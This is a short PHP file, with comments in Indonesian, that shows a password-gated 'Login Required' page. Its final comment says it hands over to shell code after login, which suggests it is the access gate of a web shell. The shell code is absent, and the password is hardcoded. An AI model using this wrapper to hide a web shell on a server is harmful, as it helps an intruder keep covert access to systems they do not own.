<?php
session_start();

// Password - ganti dengan password yang diinginkan
$login_password = 'LinkinPark';

// Cek jika sudah login
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    
    // Proses login
    $error = '';
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        // Verifikasi password
        if ($_POST['password'] === $login_password) {
            $_SESSION['loggedin'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }
    
    // Tampilkan form login
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Required</title>
        <style>
            body {
                margin: 0;
                padding: 20px;
                font-family: Arial, sans-serif;
                background: #1a1a1a;
                color: white;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .login-box {
                background: #2d2d2d;
                padding: 30px;
                border-radius: 10px;
                text-align: center;
                max-width: 350px;
                width: 100%;
                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            }
            .profile-img {
                width: 100px;
                height: 100px;
                border-radius: 50%;
                margin: 0 auto 15px;
                border: 3px solid #e53935;
            }
            .profile-img img {
                width: 100%;
                height: 100%;
                border-radius: 50%;
                object-fit: cover;
            }
            h2 {
                margin: 10px 0;
                color: #e53935;
            }
            .password-input {
                width: 100%;
                padding: 12px;
                margin: 15px 0;
                border: 1px solid #444;
                border-radius: 5px;
                background: #1a1a1a;
                color: white;
                font-size: 16px;
                box-sizing: border-box;
            }
            .password-input:focus {
                outline: none;
                border-color: #e53935;
            }
            .login-btn {
                width: 100%;
                padding: 12px;
                background: #e53935;
                color: white;
                border: none;
                border-radius: 5px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 10px;
            }
            .login-btn:hover {
                background: #c62828;
            }
            .error {
                color: #ff6b6b;
                margin: 10px 0;
                padding: 8px;
                background: rgba(229, 57, 53, 0.1);
                border-radius: 5px;
            }
            .note {
                font-size: 12px;
                color: #888;
                margin-top: 15px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="profile-img">
                <img src="https://i.imgur.com/puUsFVp.jpeg" alt="Profile" onerror="this.style.display='none'">
            </div>
            
            <h2>Login Required</h2>
            <p>Masukkan password untuk melanjutkan</p>
            
            <form method="POST">
                <input type="password" name="password" class="password-input" placeholder="Password" required>
                <button type="submit" class="login-btn">Login</button>
            </form>
            
            <?php if ($error): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            
            <div class="note">
                Akses terbatas untuk pengguna terotorisasi
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Lanjut ke kode shell jika login berhasil
?>

